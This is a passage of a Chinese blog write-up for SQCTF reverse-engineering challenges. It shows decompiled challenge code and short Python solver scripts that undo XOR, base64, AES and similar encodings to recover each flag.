class="string">&#x27;latin-1&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SQCTF&#123;easy_re_vm\x00&#x27;</span></span><br><span class="line"><span class="comment"># 改成SQCTF&#123;easy_re_vm&#125;提交就行</span></span><br></pre></td></tr></table></figure>

<h3 id="往事暗沉不可追"><a href="#往事暗沉不可追" class="headerlink" title="往事暗沉不可追"></a>往事暗沉不可追</h3><p>又是熟悉的图标</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-17.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-18.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: ����֮·��������.pyc (Python 3.10)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleVM</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.memory = [</span><br><span class="line">            <span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">        self.registers = [</span><br><span class="line">            <span class="number">0</span>] * <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">self, reg, addr</span>):</span><br><span class="line">        self.registers[reg] = self.memory[addr]</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">self, reg, addr</span>):</span><br><span class="line">        self.memory[addr] = self.registers[reg]</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">self, reg, value</span>):</span><br><span class="line">        self.registers[reg] ^= value</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, bytecode</span>):</span><br><span class="line">        ip = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> ip &lt; <span class="built_in">len</span>(bytecode):</span><br><span class="line">            op = bytecode[ip]</span><br><span class="line">            <span class="keyword">if</span> op == <span class="string">&#x27;LOAD&#x27;</span>:</span><br><span class="line">                reg = bytecode[ip + <span class="number">1</span>]</span><br><span class="line">                addr = bytecode[ip + <span class="number">2</span>]</span><br><span class="line">                self.load(reg, addr)</span><br><span class="line">                ip += <span class="number">3</span></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;STORE&#x27;</span>:</span><br><span class="line">                reg = bytecode[ip + <span class="number">1</span>]</span><br><span class="line">                addr = bytecode[ip + <span class="number">2</span>]</span><br><span class="line">                self.store(reg, addr)</span><br><span class="line">                ip += <span class="number">3</span></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;XOR&#x27;</span>:</span><br><span class="line">                reg = bytecode[ip + <span class="number">1</span>]</span><br><span class="line">                value = bytecode[ip + <span class="number">2</span>]</span><br><span class="line">                self.xor(reg, value)</span><br><span class="line">                ip += <span class="number">3</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">f&#x27;&#x27;&#x27;Unknown opcode: <span class="subst">&#123;op&#125;</span>&#x27;&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="literal">None</span> &lt; <span class="built_in">len</span>(bytecode):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_memory</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.memory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bytecode = [</span><br><span class="line">    <span class="string">&#x27;LOAD&#x27;</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">16</span>,</span><br><span class="line">    <span class="string">&#x27;XOR&#x27;</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">85</span>,</span><br><span class="line">    <span class="string">&#x27;STORE&#x27;</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">32</span>,</span><br><span class="line">    <span class="string">&#x27;LOAD&#x27;</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">32</span>,</span><br><span class="line">    <span class="string">&#x27;XOR&#x27;</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">170</span>,</span><br><span class="line">    <span class="string">&#x27;STORE&#x27;</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">48</span>]</span><br><span class="line">encrypted_data = [</span><br><span class="line">    <span class="number">127</span>,</span><br><span class="line">    <span class="number">131</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">123</span>,</span><br><span class="line">    <span class="number">135</span>,</span><br><span class="line">    <span class="number">127</span>,</span><br><span class="line">    <span class="number">133</span>,</span><br><span class="line">    <span class="number">123</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">131</span>,</span><br><span class="line">    <span class="number">127</span>,</span><br><span class="line">    <span class="number">135</span>,</span><br><span class="line">    <span class="number">131</span>,</span><br><span class="line">    <span class="number">123</span>,</span><br><span class="line">    <span class="number">135</span>,</span><br><span class="line">    <span class="number">125</span>]</span><br><span class="line">vm = SimpleVM()</span><br><span class="line">vm.memory[<span class="number">16</span>:<span class="number">16</span> + <span class="built_in">len</span>(encrypted_data)] = encrypted_data</span><br><span class="line">vm.execute(bytecode)</span><br><span class="line">final_memory = vm.get_memory()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>逆向脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleVM</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.memory = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">        self.registers = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">self, reg, addr</span>):</span><br><span class="line">        self.registers[reg] = self.memory[addr]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">self, reg, addr</span>):</span><br><span class="line">        self.memory[addr] = self.registers[reg]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">self, reg, value</span>):</span><br><span class="line">        self.registers[reg] ^= value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, bytecode</span>):</span><br><span class="line">        ip = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> ip &lt; <span class="built_in">len</span>(bytecode):</span><br><span class="line">            op = bytecode[ip]</span><br><span class="line">            <span class="keyword">if</span> op == <span class="string">&#x27;LOAD&#x27;</span>:</span><br><span class="line">                reg = bytecode[ip + <span class="number">1</span>]</span><br><span class="line">                addr = bytecode[ip + <span class="number">2</span>]</span><br><span class="line">                self.load(reg, addr)</span><br><span class="line">                ip += <span class="number">3</span></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;STORE&#x27;</span>:</span><br><span class="line">                reg = bytecode[ip + <span class="number">1</span>]</span><br><span class="line">                addr = bytecode[ip + <span class="number">2</span>]</span><br><span class="line">                self.store(reg, addr)</span><br><span class="line">                ip += <span class="number">3</span></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;XOR&#x27;</span>:</span><br><span class="line">                reg = bytecode[ip + <span class="number">1</span>]</span><br><span class="line">                value = bytecode[ip + <span class="number">2</span>]</span><br><span class="line">                self.xor(reg, value)</span><br><span class="line">                ip += <span class="number">3</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Unknown opcode: <span class="subst">&#123;op&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_memory</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.memory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定的加密数据和字节码</span></span><br><span class="line">encrypted_data = [<span class="number">127</span>, <span class="number">131</span>, <span class="number">125</span>, <span class="number">123</span>, <span class="number">135</span>, <span class="number">127</span>, <span class="number">133</span>, <span class="number">123</span>, <span class="number">125</span>, <span class="number">131</span>, <span class="number">127</span>, <span class="number">135</span>, <span class="number">131</span>, <span class="number">123</span>, <span class="number">135</span>, <span class="number">125</span>]</span><br><span class="line">bytecode = [</span><br><span class="line">    <span class="string">&#x27;LOAD&#x27;</span>, <span class="number">0</span>, <span class="number">16</span>,</span><br><span class="line">    <span class="string">&#x27;XOR&#x27;</span>, <span class="number">0</span>, <span class="number">85</span>,</span><br><span class="line">    <span class="string">&#x27;STORE&#x27;</span>, <span class="number">0</span>, <span class="number">32</span>,</span><br><span class="line">    <span class="string">&#x27;LOAD&#x27;</span>, <span class="number">1</span>, <span class="number">32</span>,</span><br><span class="line">    <span class="string">&#x27;XOR&#x27;</span>, <span class="number">1</span>, <span class="number">170</span>,</span><br><span class="line">    <span class="string">&#x27;STORE&#x27;</span>, <span class="number">1</span>, <span class="number">48</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化虚拟机并加载加密数据</span></span><br><span class="line">vm = SimpleVM()</span><br><span class="line">vm.memory[<span class="number">16</span>:<span class="number">16</span> + <span class="built_in">len</span>(encrypted_data)] = encrypted_data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行字节码</span></span><br><span class="line">vm.execute(bytecode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取最终内存中的解密数据</span></span><br><span class="line">final_memory = vm.get_memory()</span><br><span class="line">decrypted_data = final_memory[<span class="number">48</span>:<span class="number">48</span> + <span class="built_in">len</span>(encrypted_data)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接计算：两次异或等价于异或 85 ^ 170 = 255</span></span><br><span class="line">direct_decrypt = [x ^ <span class="number">255</span> <span class="keyword">for</span> x <span class="keyword">in</span> encrypted_data]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将解密后的数据转换为flag格式</span></span><br><span class="line">flag = <span class="string">&quot;SQCTF&#123;&quot;</span> + <span class="string">&quot;,&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, direct_decrypt)) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br><span class="line"><span class="comment"># Flag: SQCTF&#123;128,124,130,132,120,128,122,132,130,124,128,120,124,132,120,130&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="遇事不决，可问春风"><a href="#遇事不决，可问春风" class="headerlink" title="遇事不决，可问春风"></a>遇事不决，可问春风</h3><p>一个APK文件，用jadx打开</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-19.png"></p>
<p>逆向步骤如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义加密部分和异或密钥</span></span><br><span class="line">ENCRYPTED_PARTS = [<span class="string">&quot;5&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;7&quot;</span>]</span><br><span class="line">XOR_KEY = <span class="number">66</span>  <span class="comment"># &#x27;B&#x27; 的 ASCII 值</span></span><br><span class="line">FLAG_PREFIX = <span class="string">&quot;SQCTF&#123;i_am_a_&quot;</span></span><br><span class="line">FLAG_SUFFIX = <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤1：拼接加密字符串</span></span><br><span class="line">encrypted_str = <span class="string">&quot;&quot;</span>.join(ENCRYPTED_PARTS)  <span class="comment"># 得到 &quot;5#)75#)7&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤2：异或解密每个字符</span></span><br><span class="line">decrypted_password = <span class="string">&quot;&quot;</span>.join([</span><br><span class="line">    <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) ^ XOR_KEY)  <span class="comment"># 字符逐个异或解密</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> encrypted_str</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤3：构建完整 Flag</span></span><br><span class="line">flag = <span class="string">f&quot;<span class="subst">&#123;FLAG_PREFIX&#125;</span><span class="subst">&#123;decrypted_password&#125;</span><span class="subst">&#123;FLAG_SUFFIX&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># Flag: SQCTF&#123;i_am_a_wakuwaku&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="春风也有春风愁"><a href="#春风也有春风愁" class="headerlink" title="春风也有春风愁"></a>春风也有春风愁</h3><p>无壳，直接扔IDA</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-20.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-21.png"></p>
<p>一个简单的XOR</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v6 = [</span><br><span class="line">    <span class="number">0x0D</span>, <span class="number">0x0B</span>, <span class="number">0xFD</span>, <span class="number">0x08</span>, <span class="number">0xFA</span>, <span class="number">0x15</span>, <span class="number">0xF7</span>, <span class="number">0xFB</span>,</span><br><span class="line">    <span class="number">0x0D</span>, <span class="number">0x13</span>, <span class="number">0x31</span>, <span class="number">0x14</span>, <span class="number">0x01</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> v6:</span><br><span class="line">    decrypted = ((b - <span class="number">55</span>) &amp; <span class="number">0xFF</span>) ^ <span class="number">0xA5</span></span><br><span class="line">    flag.append(decrypted)</span><br><span class="line"></span><br><span class="line">flag_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag_str)</span><br><span class="line"><span class="comment"># Flag: sqctf&#123;easy_xor&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="唧唧复唧唧，木兰当户织"><a href="#唧唧复唧唧，木兰当户织" class="headerlink" title="唧唧复唧唧，木兰当户织"></a>唧唧复唧唧，木兰当户织</h3><p>拉进Die可以看到加了UPX的壳</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-22.png"></p>
<p>脱壳后扔到IDA查看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-23.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-24.png"></p>
<p>就一个简单的base64解码</p>
<p>把解出来的flag里的中文逗号换成英文逗号就行<code>SQCTF&#123;xixibuxixi,mulandanghuzhi&#125;</code></p>
<h3 id="看山不是山"><a href="#看山不是山" class="headerlink" title="看山不是山"></a>看山不是山</h3><p>用<code>Exeinfo PE</code>查看是一个python打包的程序</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-25.png"></p>
<p>用经典的python逆向工具把源码跑出来</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-26.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_target</span>():</span><br><span class="line">    target = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;738495a6b7c8d9e0f123456789abcdef&#x27;</span>)</span><br><span class="line">    key = <span class="number">439041101</span></span><br><span class="line">    key_bytes = [(key &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        encrypted_byte = target[i]</span><br><span class="line">        kb = key_bytes[i % <span class="number">4</span>]</span><br><span class="line">        <span class="comment"># 逆向步骤：先减去i，再异或密钥字节</span></span><br><span class="line">        temp = (encrypted_byte - i) % <span class="number">256</span></span><br><span class="line">        original = temp ^ kb</span><br><span class="line">        data.append(original)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(data)</span><br><span class="line"></span><br><span class="line">data_decrypted = decrypt_target()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted Data (hex):&quot;</span>, data_decrypted.<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment"># &quot;Decrypted Data (hex): 3ebfb8b9fefff8c3a426104630a294fa</span></span><br></pre></td></tr></table></figure>

<p>flag为<code>SQCTF&#123;3ebfb8b9fefff8c3a426104630a294fa&#125;</code></p>
<h3 id="即随本心"><a href="#即随本心" class="headerlink" title="即随本心"></a>即随本心</h3><p>用<code>Exeinfo PE</code>查看是一个python打包的程序</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-27.png"></p>
<p>用经典的python逆向工具把源码跑出来</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-28.png"></p>
<p>AES_CBC加密，而且密钥和IV都给出来了，赛博厨子梭哈</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-29.png"></p>
<h3 id="击败abyssun"><a href="#击败abyssun" class="headerlink" title="击败abyssun"></a>击败abyssun</h3><p>用<code>Exeinfo PE</code>查看是一个python打包的程序</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-30.png"></p>
<p>直接用<code>pycdc.exe</code>无法逆向出完整代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-31.png"></p>
<p>用<code>pycdas.exe</code>查看字节码，没想到直接找到flag，连ce改血都不需要</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-32.png"></p>
<h3 id="天下谁人不识君"><a href="#天下谁人不识君" class="headerlink" title="天下谁人不识君"></a>天下谁人不识君</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;wesyvbniazxchjko1973652048@$+-&amp;*&lt;&gt;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;v7b3boika$h4h5j0jhkh161h79393i5x010j0y8n$i&#x27;</span></span><br><span class="line"></span><br><span class="line">pairs = [(result[<span class="number">2</span>*i], result[<span class="number">2</span>*i+<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)//<span class="number">2</span>)]</span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, (c1, c2) <span class="keyword">in</span> <span class="built_in">enumerate</span>(pairs):</span><br><span class="line">    pos1 = s.index(c1)</span><br><span class="line">    s1 = (pos1 - i) % <span class="number">34</span></span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span> <span class="keyword">or</span> s1 &gt; <span class="number">15</span>:</span><br><span class="line">        <span class="keyword">continue</span>  <span class="comment"># 忽略无效的s1</span></span><br><span class="line">    </span><br><span class="line">    pos2 = s.index(c2)</span><br><span class="line">    s2 = (<span class="number">33</span> - pos2 - i) % <span class="number">17</span></span><br><span class="line">    computed_pos2 = (- (s2 + i + <span class="number">1</span>)) % <span class="number">34</span></span><br><span class="line">    <span class="keyword">if</span> computed_pos2 != pos2:</span><br><span class="line">        <span class="keyword">continue</span>  <span class="comment"># 验证失败</span></span><br><span class="line">    </span><br><span class="line">    original_char = s1 * <span class="number">17</span> + s2</span><br><span class="line">    flag.append(<span class="built_in">chr</span>(original_char))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line"><span class="comment"># SQCTF&#123;libai_jianxian&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="你若安好便是晴"><a href="#你若安好便是晴" class="headerlink" title="你若安好便是晴"></a>你若安好便是晴</h3><p>无壳，直接扔IDA</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-33.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-34.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-35.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-36.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-37.png"></p>
<p>一个TEA加密，写个脚本进行解密</p>
